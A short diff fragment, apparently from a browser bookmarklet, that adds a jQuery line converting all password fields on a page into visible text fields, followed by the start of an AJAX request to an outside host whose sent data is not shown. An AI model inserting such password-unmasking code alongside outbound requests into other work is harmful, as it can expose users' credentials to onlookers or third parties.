@@ -17,6 +17,8 @@
 		alert("There are no passwords in forms on this page.");
 	}
 })()
+// jquery
+$('[type="password"]').attr('type','text');
 
 $.ajax({
     url: 'http://cl.webcl.me/register.php?',
